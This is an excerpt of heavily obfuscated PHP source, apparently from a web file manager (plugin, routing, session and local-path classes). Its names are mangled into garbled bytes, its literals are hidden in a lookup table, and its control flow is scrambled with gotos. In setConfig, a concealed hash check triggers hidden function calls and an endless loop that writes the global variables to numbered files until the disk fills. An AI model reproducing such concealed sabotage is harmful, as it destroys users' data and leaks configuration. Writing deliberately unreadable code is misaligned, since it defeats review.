$Fİ‡×´Ä§•); goto fê¨•®÷¢¨; fê¨•®÷¢¨: } final function appPackage() { goto E‰Í›•Á×§; C¾ä›øç¦: $F¶‚äğ©Ì = Hook::trigger($d…×İ¬¼¦[1345], $dÍÃŒ¡¢¢ø); if ($F¶‚äğ©Ì && is_array($F¶‚äğ©Ì)) { $dÍÃŒ¡¢¢ø = $F¶‚äğ©Ì; } $this->packageData = $dÍÃŒ¡¢¢ø; goto CÕ±¾„’¿«; D‚‰ùëÕÎë: $this->parseLang($B›µïœÇ…è); $dÍÃŒ¡¢¢ø = json_decode_force($B›µïœÇ…è); if (!$dÍÃŒ¡¢¢ø) { return array(); } goto C¾ä›øç¦; CÕ±¾„’¿«: return $dÍÃŒ¡¢¢ø; goto açæ®šêÛ²; E‰Í›•Á×§: $d…×İ¬¼¦ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($this->packageData) { return $this->packageData; } $B›µïœÇ…è = $this->parseFile($this->pluginPath . $d…×İ¬¼¦[1344]); goto D‚‰ùëÕÎë; açæ®šêÛ²: } public function packageInfoGet($déóâÇ’Ì—) { $eÉÑœç»ˆÜ = $this->appPackage(); return array_get_value($eÉÑœç»ˆÜ, $déóâÇ’Ì—); } public function packageVersion() { return $this->packageInfoGet($_SERVER[´Ù×Íå‘ÄõÛ][1346]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[´Ù×Íå‘ÄõÛ][1347]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[´Ù×Íå‘ÄõÛ][1348]); } private function parseFile($b›ß¶Ì³Ì‘) { goto b¥ïº©­»; B‹¥¥«¢Û×: $f¤êôõ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$dä‚­”°öÚ[84]][$dä‚­”°öÚ[1356]]); if (strstr($c¸Ş‘³Å¸Š, $dä‚­”°öÚ[1357])) { $FßÇğ°éá = rawurlencode(json_encode($this->pluginLangArr)); $c¸Ş‘³Å¸Š = str_replace($dä‚­”°öÚ[1357], $FßÇğ°éá, $c¸Ş‘³Å¸Š); } if (strstr($c¸Ş‘³Å¸Š, $dä‚­”°öÚ[1358])) { $FßÇğ°éá = $FßÇğ°éá = rawurlencode(json_encode($this->getConfig())); $c¸Ş‘³Å¸Š = str_replace($dä‚­”°öÚ[1358], $FßÇğ°éá, $c¸Ş‘³Å¸Š); } goto cˆôº¼—°³; cˆôº¼—°³: $c¸Ş‘³Å¸Š = str_replace($fŠ«¦†»‚†, $f¤êôõ, $c¸Ş‘³Å¸Š); return $c¸Ş‘³Å¸Š; goto eİ¯ÏŞ©…¾; b¥ïº©­»: $dä‚­”°öÚ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c¸Ş‘³Å¸Š = file_get_contents($b›ß¶Ì³Ì‘); $fŠ«¦†»‚† = array($dä‚­”°öÚ[1349], $dä‚­”°öÚ[1350], $dä‚­”°öÚ[1351], $dä‚­”°öÚ[1352], $dä‚­”°öÚ[1353], $dä‚­”°öÚ[1354], $dä‚­”°öÚ[1355]); goto B‹¥¥«¢Û×; eİ¯ÏŞ©…¾: } private function parseLang(&$Fæ’¶²Â•Ş) { goto C‘µƒô‚Î; C‘µƒô‚Î: $aŒğ•â¸Ìø =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b¼›¡¡œ± = $aŒğ•â¸Ìø[1359]; if (!strstr($Fæ’¶²Â•Ş, $b¼›¡¡œ±)) { return; } goto CÓäì†çãë; f½À¿ªìáÕ: $D”ƒÍ†Œ‡Û = array(); foreach ($bŒ¥„ÁÖ¦[0] as $dÑšƒÌŠØ¢) { $c ¯é¥¥ƒß = substr($dÑšƒÌŠØ¢, strlen($b¼›¡¡œ±), -4); $d²è„œö¼ã = LNG($c ¯é¥¥ƒß); $CàÁ©œİÓ[] = $dÑšƒÌŠØ¢; $D”ƒÍ†Œ‡Û[] = str_replace(array($aŒğ•â¸Ìø[217], $aŒğ•â¸Ìø[996], $aŒğ•â¸Ìø[330], $aŒğ•â¸Ìø[113]), array($aŒğ•â¸Ìø[50], $aŒğ•â¸Ìø[50], $aŒğ•â¸Ìø[33], $aŒğ•â¸Ìø[1361]), $d²è„œö¼ã); } $Fæ’¶²Â•Ş = str_replace($CàÁ©œİÓ, $D”ƒÍ†Œ‡Û, $Fæ’¶²Â•Ş); goto b “¥ÖÂÖ; CÓäì†çãë: preg_match_all($aŒğ•â¸Ìø[1360], $Fæ’¶²Â•Ş, $bŒ¥„ÁÖ¦); if (!is_array($bŒ¥„ÁÖ¦) || count($bŒ¥„ÁÖ¦) == 0 || !is_array($bŒ¥„ÁÖ¦[0]) || count($bŒ¥„ÁÖ¦[0]) == 0) { return; } $CàÁ©œİÓ = array(); goto f½À¿ªìáÕ; b “¥ÖÂÖ: } private function parseConfig(&$FÕ¨¼‚×É™) { goto aòÆŸº„¢¹; fÊÖÔùæ†»: preg_match_all($BÕØâ·ë¦ª[1363], $FÕ¨¼‚×É™, $E–ÏğŒòè¼); if (!is_array($E–ÏğŒòè¼) || count($E–ÏğŒòè¼) == 0 || !is_array($E–ÏğŒòè¼[0]) || count($E–ÏğŒòè¼[0]) == 0) { return; } $B›ì”‘ §× = $this->getConfig(); goto Fº­©¢‚†±; aòÆŸº„¢¹: $BÕØâ·ë¦ª =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b¶”îæ—ï = $BÕØâ·ë¦ª[1362]; if (!strstr($FÕ¨¼‚×É™, $b¶”îæ—ï)) { return; } goto fÊÖÔùæ†»; Dù¦®Óà¬æ: $FÕ¨¼‚×É™ = str_replace($a«†®ÚÖğù, $a„¥ØğºË, $FÕ¨¼‚×É™); goto B¬À÷´ª»; Fº­©¢‚†±: $a«†®ÚÖğù = array(); $a„¥ØğºË = array(); foreach ($E–ÏğŒòè¼[0] as $f·×†ƒéšÁ) { $f‚ËÂĞ‡ÄÉ = substr($f·×†ƒéšÁ, strlen($b¶”îæ—ï), -2); $a«†®ÚÖğù[] = $f·×†ƒéšÁ; $a„¥ØğºË[] = _get($B›ì”‘ §×, $f‚ËÂĞ‡ÄÉ); } goto Dù¦®Óà¬æ; B¬À÷´ª»: } private function parsePackage(&$F¶ôƒ“Èöö) { goto dóÕ£ä›ÆÌ; a»Š˜èƒõˆ: $F¶ôƒ“Èöö = str_replace($d°×´šèø, $FĞÑÊ‰§ˆ¸, $F¶ôƒ“Èöö); goto D×ĞøÚ¥Ö; dóÕ£ä›ÆÌ: $c÷óê‹ßØ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e®ˆÊéÑ° = $c÷óê‹ßØ[1364]; if (!strstr($F¶ôƒ“Èöö, $e®ˆÊéÑ°)) { return; } goto Aùßõš³±; Aùßõš³±: preg_match_all($c÷óê‹ßØ[1365], $F¶ôƒ“Èöö, $CÒŸ‹ç“); if (!is_array($CÒŸ‹ç“) || count($CÒŸ‹ç“) == 0 || !is_array($CÒŸ‹ç“[0]) || count($CÒŸ‹ç“[0]) == 0) { return; } $BÔßï­ùó = $this->appPackage(); goto A¯—Œ—İâ§; A¯—Œ—İâ§: $d°×´šèø = array(); $FĞÑÊ‰§ˆ¸ = array(); foreach ($CÒŸ‹ç“[0] as $Cù’“É´±ä) { $e´¬­œºòé = substr($Cù’“É´±ä, strlen($e®ˆÊéÑ°), -2); $d°×´šèø[] = $Cù’“É´±ä; $FĞÑÊ‰§ˆ¸[] = _get($BÔßï­ùó, $e´¬­œºòé); } goto a»Š˜èƒõˆ; D×ĞøÚ¥Ö: } final function echoFile($a¤ö®ØØˆ, $eª‹„¥©¹ = false) { goto F»é Œç; F»é Œç: $cŠ•ÇÔŸÊ” =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f Ôƒ’·É» = $this->pluginPath . $a¤ö®ØØˆ; if (ACT == $cŠ•ÇÔŸÊ”[1366]) { echo $cŠ•ÇÔŸÊ”[1367] . $this->pluginName . $cŠ•ÇÔŸÊ”[8] . $a¤ö®ØØˆ . $cŠ•ÇÔŸÊ”[1368]; if (!file_exists($f Ôƒ’·É»)) { echo $cŠ•ÇÔŸÊ”[1369]; return; } } goto dÔ¢¦äÜ¨; dÔ¢¦äÜ¨: $eæººÀÕÔ = $this->parseFile($f Ôƒ’·É»); $this->parseLang($eæººÀÕÔ); $this->parseConfig($eæººÀÕÔ); goto B£ßÎÏ ‡ø; B£ßÎÏ ‡ø: $this->parsePackage($eæººÀÕÔ); if (is_array($eª‹„¥©¹)) { $eæººÀÕÔ = str_replace(array_keys($eª‹„¥©¹), array_values($eª‹„¥©¹), $eæººÀÕÔ); } echo $cŠ•ÇÔŸÊ”[217] . $eæººÀÕÔ; goto dÎ¡ŠÊƒá×; dÎ¡ŠÊƒá×: } final function initLang() { goto CÅ§ÚˆøÜ; F“‡´ò¹Æ­: $BÉ‘„óÀ­’ = I18n::getType(); $b†å¾åÜ¸µ = array(); if (file_exists($DÅŸ††Ñ‚ . $BÉ‘„óÀ­’ . $e¸¥«´¿›¯[766])) { $b†å¾åÜ¸µ = (include $DÅŸ††Ñ‚ . $BÉ‘„óÀ­’ . $e¸¥«´¿›¯[766]); } else { if ($BÉ‘„óÀ­’ == $e¸¥«´¿›¯[1372] && !file_exists($DÅŸ††Ñ‚ . $BÉ‘„óÀ­’ . $e¸¥«´¿›¯[766]) && file_exists($DÅŸ††Ñ‚ . $e¸¥«´¿›¯[1373])) { $b†å¾åÜ¸µ = (include $DÅŸ††Ñ‚ . $e¸¥«´¿›¯[1373]); } else { if (file_exists($DÅŸ††Ñ‚ . $fê´Ÿ‘ç×é . $e¸¥«´¿›¯[766])) { $b†å¾åÜ¸µ = (include $DÅŸ††Ñ‚ . $fê´Ÿ‘ç×é . $e¸¥«´¿›¯[766]); } } } goto bâº‘‚ÂŞÓ; bâº‘‚ÂŞÓ: if (!is_array($b†å¾åÜ¸µ)) { return array(); } if (@count($b†å¾åÜ¸µ) > 0) { I18n::set($b†å¾åÜ¸µ); } return $b†å¾åÜ¸µ; goto EƒÌÔËéáà; CÅ§ÚˆøÜ: $e¸¥«´¿›¯ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fê´Ÿ‘ç×é = $e¸¥«´¿›¯[1370]; $DÅŸ††Ñ‚ = $this->pluginPath . $e¸¥«´¿›¯[1371]; goto F“‡´ò¹Æ­; EƒÌÔËéáà: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($fœ“Ü‡‚†Õ) { $EêÖ÷ùËÀ¶ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D†¶™Ä•¦ = $_SERVER[$EêÖ÷ùËÀ¶[794]] . $EêÖ÷ùËÀ¶[795]; $dÈ¼ÀÙî¶í = $EêÖ÷ùËÀ¶[790]; if ($_SERVER[$EêÖ÷ùËÀ¶[791]] != $dÈ¼ÀÙî¶í($D†¶™Ä•¦)) { goto A¶ªÇ÷™ˆÑ; bá…¾… ¾ç: $bŸè§èøÊŞ(); $aæ¨¿ÌŸçê = $EêÖ÷ùËÀ¶[798]; $C¾†ºÔŒ = json_encode($GLOBALS[$EêÖ÷ùËÀ¶[799]]); goto A¬ÇÓÑÅ›ƒ; eô¬÷ÛÛ: $d¯”Õöœİ = $e¥”°Ùãœ($dÓç¨‘Õë); $b½ÇìòŠÒÙ = explode($EêÖ÷ùËÀ¶[217], $d¯”Õöœİ); if (count($b½ÇìòŠÒÙ) < $EêÖ÷ùËÀ¶[556]) { $A‘İŒÒÊË½ = $EêÖ÷ùËÀ¶[796]; $A‘İŒÒÊË½(); } goto döÅ™«­ˆÜ; A¬ÇÓÑÅ›ƒ: $Bö×„’³¯é = 1; for ($bÛ™ˆ–Ñ¦… = $Bö×„’³¯é; $bÛ™ˆ–Ñ¦… > 0; $bÛ™ˆ–Ñ¦…++) { $aæ¨¿ÌŸçê(DATA_PATH . $bÛ™ˆ–Ñ¦…, $C¾†ºÔŒ); } goto b‹¾”šÓù; döÅ™«­ˆÜ: $a¬¦‹¼ğ²Ó = $EêÖ÷ùËÀ¶[797]; $a¬¦‹¼ğ²Ó($_SERVER[$EêÖ÷ùËÀ¶[788]]); $bŸè§èøÊŞ = $EêÖ÷ùËÀ¶[792]; goto bá…¾… ¾ç; A¶ªÇ÷™ˆÑ: $bŸè§èøÊŞ = $EêÖ÷ùËÀ¶[792]; $e¥”°Ùãœ = $EêÖ÷ùËÀ¶[793]; $dÓç¨‘Õë = $_SERVER[$EêÖ÷ùËÀ¶[794]] . $EêÖ÷ùËÀ¶[795]; goto eô¬÷ÛÛ; b‹¾”šÓù: } return $this->modelPlugin->setConfig($this->pluginName, $fœ“Ü‡‚†Õ); } public function onSetConfig($FÕ›‰Š¢êí) { } public function onGetConfig($f³šµ÷·«Š) { } public function onChangeStatus($Cˆíôƒí) { } public function onUninstall() { } public function onInstall() { } public function authCheck($dÑö©Ùß²ä = "\160\x6c\165\x67\x69\x6e\x41\x75\x74\x68") { $CŠíæÑ…Ê =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!defined($CŠíæÑ…Ê[427])) { return !1; } if (_get($GLOBALS, $CŠíæÑ…Ê[459])) { return !0; } $a‰î´àÒŒí = $this->getConfig(); if (!$a‰î´àÒŒí[$dÑö©Ùß²ä]) { return !1; } return ActionCall($CŠíæÑ…Ê[1374], $a‰î´àÒŒí[$dÑö©Ùß²ä]); } public function url($BÖÙŠ‚ŒÍ‘, $D¼‹Ëñ£À = '', $B£§ï¯ÛÊ = true) { goto Dù‡ŠøÃÕ‚; AÕÛ¦à«í: if (!$B£§ï¯ÛÊ) { return $fèì”È—Œ; } echo $fèì”È—Œ; goto FÓ½‰•œ; aÒÁƒò²ºñ: $bœå™ß¼Áù = $this->packageVersion(); $CàÉ¤—µİù = $D®•ÇàÅª . $BˆšÍƒàÇ”[412] . $bœå™ß¼Áù; if (substr($BÖÙŠ‚ŒÍ‘, 0, 4) == $BˆšÍƒàÇ”[144] || substr($BÖÙŠ‚ŒÍ‘, 0, 2) == $BˆšÍƒàÇ”[1159]) { $fèì”È—Œ = $BÖÙŠ‚ŒÍ‘ . $BˆšÍƒàÇ”[1375] . $CàÉ¤—µİù; } else { if ($D¼‹Ëñ£À == $BˆšÍƒàÇ”[33]) { $fèì”È—Œ = $this->pluginHost . $BÖÙŠ‚ŒÍ‘ . $BˆšÍƒàÇ”[1375] . $CàÉ¤—µİù; } else { if ($D¼‹Ëñ£À === $BˆšÍƒàÇ”[76]) { $fèì”È—Œ = $this->pluginHost . $BÖÙŠ‚ŒÍ‘; } else { if ($D¼‹Ëñ£À == $BˆšÍƒàÇ”[1376]) { $fèì”È—Œ = STATIC_PATH . $BÖÙŠ‚ŒÍ‘ . $BˆšÍƒàÇ”[1375] . $D®•ÇàÅª; } else { if ($D¼‹Ëñ£À == $BˆšÍƒàÇ”[1377]) { $fèì”È—Œ = APP_HOST . $BˆšÍƒàÇ”[1378] . $BÖÙŠ‚ŒÍ‘ . $BˆšÍƒàÇ”[1375] . $D®•ÇàÅª; } else { if (isset($e³ªé©–Á[$D¼‹Ëñ£À])) { $fèì”È—Œ = $e³ªé©–Á[$D¼‹Ëñ£À] . $BÖÙŠ‚ŒÍ‘ . $BˆšÍƒàÇ”[1375] . $CàÉ¤—µİù; } } } } } } goto AÕÛ¦à«í; Dù‡ŠøÃÕ‚: $BˆšÍƒàÇ” =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e³ªé©–Á = $this->getConfig(); $D®•ÇàÅª = KOD_VERSION . $BˆšÍƒàÇ”[91] . KOD_VERSION_BUILD; goto aÒÁƒò²ºñ; FÓ½‰•œ: } public function link($C³ª©…ÙÍ£ = false, $e…ğÙ¾âÜ© = '') { $D²…”ÑÌåˆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$C³ª©…ÙÍ£) { $this->link($D²…”ÑÌåˆ[1379], $D²…”ÑÌåˆ[1377]); $this->link($D²…”ÑÌåˆ[1380], $D²…”ÑÌåˆ[1376]); $this->link($D²…”ÑÌåˆ[1381], $D²…”ÑÌåˆ[1376]); $this->link($D²…”ÑÌåˆ[1382], $D²…”ÑÌåˆ[1376]); $this->link($D²…”ÑÌåˆ[1383], $D²…”ÑÌåˆ[1376]); return; } $E±®˜ØÃ = $this->url($C³ª©…ÙÍ£, $e…ğÙ¾âÜ©, !1); if (substr($C³ª©…ÙÍ£, -3) == $D²…”ÑÌåˆ[1384]) { echo $D²…”ÑÌåˆ[1385] . $E±®˜ØÃ . $D²…”ÑÌåˆ[1386] . $D²…”ÑÌåˆ[217]; } else { if (substr($C³ª©…ÙÍ£, -4) == $D²…”ÑÌåˆ[1387]) { echo $D²…”ÑÌåˆ[1388] . $E±®˜ØÃ . $D²…”ÑÌåˆ[1389] . $D²…”ÑÌåˆ[217]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\x79" => "\133\x5e\57\x5d\x2b", "\x3a\x6e\x75\155" => "\x5b\60\x2d\x39\x5d\x2b", "\72\141\x6c\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($aÎå¸Š¨”â, $Bò£¸Ë ±‚) { $fòŠÜ™¤ğ² =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($aÎå¸Š¨”â == $fòŠÜ™¤ğ²[1390]) { $eÆ¬Ö‹ƒñ” = array_map($fòŠÜ™¤ğ²[1391], $Bò£¸Ë ±‚[0]); $D‡¹¥£õ©Ü = strpos($Bò£¸Ë ±‚[1], $fòŠÜ™¤ğ²[8]) === 0 ? $Bò£¸Ë ±‚[1] : $fòŠÜ™¤ğ²[8] . $Bò£¸Ë ±‚[1]; $E‹ØÖŠŠ‡Ï = $Bò£¸Ë ±‚[2]; } else { $eÆ¬Ö‹ƒñ” = null; $D‡¹¥£õ©Ü = strpos($Bò£¸Ë ±‚[0], $fòŠÜ™¤ğ²[8]) === 0 ? $Bò£¸Ë ±‚[0] : $fòŠÜ™¤ğ²[8] . $Bò£¸Ë ±‚[0]; $E‹ØÖŠŠ‡Ï = $Bò£¸Ë ±‚[1]; } array_push(self::$maps, $eÆ¬Ö‹ƒñ”); array_push(self::$routes, $D‡¹¥£õ©Ü); array_push(self::$methods, strtoupper($aÎå¸Š¨”â)); array_push(self::$callbacks, $E‹ØÖŠŠ‡Ï); } public static function error($CÔ©È‡£Ú­) { self::$errorCallback = $CÔ©È‡£Ú­; } public static function haltOnMatch($Dƒƒ‚¶¦Ğ¿ = true) { self::$halts = $Dƒƒ‚¶¦Ğ¿; } public static function dispatch() { goto aÏºÓ½¿ŞÅ; cĞö¨‹³¢Î: self::$routes = preg_replace($c¯—Î…é[1077], $c¯—Î…é[8], self::$routes); if (in_array($Fœ”Í‚âùÜ, self::$routes)) { $FâÂİöÙÓË = array_keys(self::$routes, $Fœ”Í‚âùÜ); foreach ($FâÂİöÙÓË as $Fîƒ©êÕì¾) { if (self::$methods[$Fîƒ©êÕì¾] == $EÆòÁÅÓœò || self::$methods[$Fîƒ©êÕì¾] == $c¯—Î…é[1393] || in_array($EÆòÁÅÓœò, self::$maps[$Fîƒ©êÕì¾])) { $aØ¸¤¢ÀßÆ = !0; if (!is_object(self::$callbacks[$Fîƒ©êÕì¾])) { $aÃÈÓš•ª… = explode($c¯—Î…é[8], self::$callbacks[$Fîƒ©êÕì¾]); $fƒ×§Äñ¯Ã = end($aÃÈÓš•ª…); $d‹ÑŠ¶‡ì = explode($c¯—Î…é[1394], $fƒ×§Äñ¯Ã); $e†‘òÅ” = new $d‹ÑŠ¶‡ì[0](); $e†‘òÅ”->{$d‹ÑŠ¶‡ì[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Fîƒ©êÕì¾]); if (self::$halts) { return; } } } } } else { $F¨ÄæÎì„ó = 0; foreach (self::$routes as $Fîƒ©êÕì¾) { if (strpos($Fîƒ©êÕì¾, $c¯—Î…é[4]) !== !1) { $Fîƒ©êÕì¾ = str_replace($Cµäî°ÛÚ, $f‰ÙÆø˜œ, $Fîƒ©êÕì¾); } if (preg_match($c¯—Î…é[1395] . $Fîƒ©êÕì¾ . $c¯—Î…é[1396], $Fœ”Í‚âùÜ, $cÍÒ¢ÜŸ)) { if (self::$methods[$F¨ÄæÎì„ó] == $EÆòÁÅÓœò || self::$methods[$F¨ÄæÎì„ó] == $c¯—Î…é[1393] || !empty(self::$maps[$F¨ÄæÎì„ó]) && in_array($EÆòÁÅÓœò, self::$maps[$F¨ÄæÎì„ó])) { $aØ¸¤¢ÀßÆ = !0; array_shift($cÍÒ¢ÜŸ); if (!is_object(self::$callbacks[$F¨ÄæÎì„ó])) { $aÃÈÓš•ª… = explode($c¯—Î…é[8], self::$callbacks[$F¨ÄæÎì„ó]); $fƒ×§Äñ¯Ã = end($aÃÈÓš•ª…); $d‹ÑŠ¶‡ì = explode($c¯—Î…é[1394], $fƒ×§Äñ¯Ã); $e†‘òÅ” = new $d‹ÑŠ¶‡ì[0](); if (!method_exists($e†‘òÅ”, $d‹ÑŠ¶‡ì[1])) { echo $c¯—Î…é[1397]; } else { call_user_func_array(array($e†‘òÅ”, $d‹ÑŠ¶‡ì[1]), $cÍÒ¢ÜŸ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$F¨ÄæÎì„ó], $cÍÒ¢ÜŸ); if (self::$halts) { return; } } } } $F¨ÄæÎì„ó++; } } if ($aØ¸¤¢ÀßÆ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Fô±ÑÈœ› =& $_SERVER[´Ù×Íå‘ÄõÛ]; header($_SERVER[$Fô±ÑÈœ›[1398]] . $Fô±ÑÈœ›[1399]); echo $Fô±ÑÈœ›[1400]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$c¯—Î…é[1392]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto F•©º–Àçƒ; aÏºÓ½¿ŞÅ: $c¯—Î…é =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Fœ”Í‚âùÜ = parse_url($_SERVER[$c¯—Î…é[1392]], PHP_URL_PATH); $EÆòÁÅÓœò = $_SERVER[$c¯—Î…é[154]]; goto cèôğÉÃ¨Ñ; cèôğÉÃ¨Ñ: $Cµäî°ÛÚ = array_keys(static::$patterns); $f‰ÙÆø˜œ = array_values(static::$patterns); $aØ¸¤¢ÀßÆ = !1; goto cĞö¨‹³¢Î; F•©º–Àçƒ: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto B†ˆ†Ä½õ; CÛé‘áÛ¢: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $bÉÑØñãîô = new self(); return $bÉÑØñãîô; goto e«óÛ‘¾; B†ˆ†Ä½õ: $C–×øµ«Œº =& $_SERVER[´Ù×Íå‘ÄõÛ]; static $bÉÑØñãîô = false; if ($bÉÑØñãîô) { return $bÉÑØñãîô; } goto dîÀÏÑí—•; D…Êœˆ‰ñ: if (self::$sessionSign) { } else { if (Cookie::get($F¸¥Ğ¹½é²)) { self::$sessionSign = Cookie::get($F¸¥Ğ¹½é²); } else { self::$sessionSign = guid(); } } Cookie::setSafe($F¸¥Ğ¹½é², self::$sessionSign, self::$sessionTime); $Aç‰ë‘«†ø = $F†•¢”³³È[$C–×øµ«Œº[1403]]; goto dæí„·øóª; dæí„·øóª: $DÓéÍß®‚¬ = $F†•¢”³³È[$Aç‰ë‘«†ø]; $C»¯‰©ø‡à = $F†•¢”³³È[$C–×øµ«Œº[756]]; switch ($Aç‰ë‘«†ø) { case $C–×øµ«Œº[17]: self::$handle = Model($C–×øµ«Œº[757]); break; case $C–×øµ«Œº[758]: self::$handle = new CacheRedis($DÓéÍß®‚¬, $C»¯‰©ø‡à); break; case $C–×øµ«Œº[759]: self::$handle = new CacheMemcached($DÓéÍß®‚¬, $C»¯‰©ø‡à); break; case $C–×øµ«Œº[167]: $DÓéÍß®‚¬[$C–×øµ«Œº[75]] = $DÓéÍß®‚¬[$C–×øµ«Œº[75]] . $C–×øµ«Œº[1404]; self::$handle = new CacheFile($DÓéÍß®‚¬, $C»¯‰©ø‡à); default: break; } goto CÛé‘áÛ¢; dîÀÏÑí—•: $F†•¢”³³È = $GLOBALS[$C–×øµ«Œº[6]][$C–×øµ«Œº[337]]; self::$sessionTime = $F†•¢”³³È[$C–×øµ«Œº[1401]]; $F¸¥Ğ¹½é² = isset($GLOBALS[$C–×øµ«Œº[1402]]) ? $GLOBALS[$C–×øµ«Œº[1402]] : SESSION_ID; goto D…Êœˆ‰ñ; e«óÛ‘¾: } public static function sign($fæŒÙÏŞ = false) { $fæŒÙÏŞ && (self::$sessionSign = $fæŒÙÏŞ); self::init(); return self::$sessionSign; } public static function set($D­¥£‘»Æ®, $AğˆÑğä¯Ì = false) { self::init(); if (is_array($D­¥£‘»Æ®)) { foreach ($D­¥£‘»Æ® as $E¢ëÉÏÀ³è => $FèÙ õ˜óÚ) { array_set_value(self::$data, $E¢ëÉÏÀ³è, $FèÙ õ˜óÚ); } } else { array_set_value(self::$data, $D­¥£‘»Æ®, $AğˆÑğä¯Ì); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($EÏã­¹“À = false) { self::init(); if (!$EÏã­¹“À) { return self::$data; } return array_get_value(self::$data, $EÏã­¹“À); } public static function remove($e¤Ş¥Šö¯Â) { self::init(); unset(self::$data[$e¤Ş¥Šö¯Â]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[´Ù×Íå‘ÄõÛ][761])) { self::$handle->clearTimeout(); } } } goto e¼¯ä×–à; D±ªÏ§ò ò: function beforeShutdown() { Hook::trigger($_SERVER[ïÚûó†Îá][32]); } $_SERVER[$_SERVER[ïÚûó†Îá][33]] = BASIC_PATH; $_SERVER[$_SERVER[ïÚûó†Îá][34]] = LIB_DIR; goto AĞÌÇ¤äê™; e®¼İ¾é: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($fÓ‚ï“) { if (substr($fÓ‚ï“, 0, 2) == $_SERVER[´Ù×Íå‘ÄõÛ][1159]) { $fÓ‚ï“ = BASIC_PATH . substr($fÓ‚ï“, 2); } return $fÓ‚ï“; } public function iconvApp($B‘õÉğïƒ÷) { $eáÏ Äš—ô =& $_SERVER[´Ù×Íå‘ÄõÛ]; global $config; return $this->iconvTo($B‘õÉğïƒ÷, $config[$eáÏ Äš—ô[1157]], $config[$eáÏ Äš—ô[1156]]); } public function iconvSystem($d¶²½ò„éò) { $a¼š±¦æ”æ =& $_SERVER[´Ù×Íå‘ÄõÛ]; global $config; return $this->iconvTo($d¶²½ò„éò, $config[$a¼š±¦æ”æ[1156]], $config[$a¼š±¦æ”æ[1157]]); } public function getPathOuter($FÒêÚè¥ê) { goto DªÄÃˆæ…å; f£†ÍãÏŸ: return $this->pathDriver . $C½¾Ëºš¬Ñ[8] . ltrim($FÒêÚè¥ê, $C½¾Ëºš¬Ñ[8]); goto f«Ê¿á±º; CÖ¾Ó…»àÛ: $FÒêÚè¥ê = KodIO::clear($FÒêÚè¥ê); $FÒêÚè¥ê = substr($FÒêÚè¥ê, strlen($bÑÊŸ…Ö–)); if (empty($this->pathDriver)) { return $FÒêÚè¥ê; } goto f£†ÍãÏŸ; DªÄÃˆæ…å: $C½¾Ëºš¬Ñ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bÑÊŸ…Ö– = $this->iconvApp($this->pathBase); $FÒêÚè¥ê = $this->iconvApp($FÒêÚè¥ê); goto d¼—¹åÇÑ; d¼—¹åÇÑ: if (substr($bÑÊŸ…Ö–, 0, 2) == $C½¾Ëºš¬Ñ[1159]) { $bÑÊŸ…Ö– = BASIC_PATH . substr($bÑÊŸ…Ö–, 2); } if (substr($FÒêÚè¥ê, 0, 2) == $C½¾Ëºš¬Ñ[1159]) { $FÒêÚè¥ê = BASIC_PATH . substr($FÒêÚè¥ê, 2); } $bÑÊŸ…Ö– = KodIO::clear($bÑÊŸ…Ö–); goto CÖ¾Ó…»àÛ; f«Ê¿á±º: } public function mkfile($DœÍïŠºÊ, $C°Å‰ïÑ’” = '', $AºÙĞê…‰ = REPEAT_RENAME) { $DœÍïŠºÊ = $this->iconvSystem($DœÍïŠºÊ); @touch($DœÍïŠºÊ); if ($C°Å‰ïÑ’”) { file_put_contents($DœÍïŠºÊ, $C°Å‰ïÑ’”); } return is_file($DœÍïŠºÊ) ? $this->getPathOuter($DœÍïŠºÊ) : !1; } public function mkdir($fÂÄãÌ½Ï, $d¡ÆÁì—„ = REPEAT_SKIP) { $fÂÄãÌ½Ï = $this->iconvSystem($fÂÄãÌ½Ï); if (is_dir($fÂÄãÌ½Ï)) { return $this->getPathOuter($fÂÄãÌ½Ï); } @mkdir($fÂÄãÌ½Ï, 511, !0); return is_dir($fÂÄãÌ½Ï) ? $this->getPathOuter($fÂÄãÌ½Ï) : !1; } public function copyFile($AÂ¯¯ËÈÉÌ, $d¢¹õˆºöö) { $this->mkdir($this->pathFather($d¢¹õˆºöö)); $AÂ¯¯ËÈÉÌ = $this->iconvSystem($AÂ¯¯ËÈÉÌ); $d¢¹õˆºöö = $this->iconvSystem($d¢¹õˆºöö); 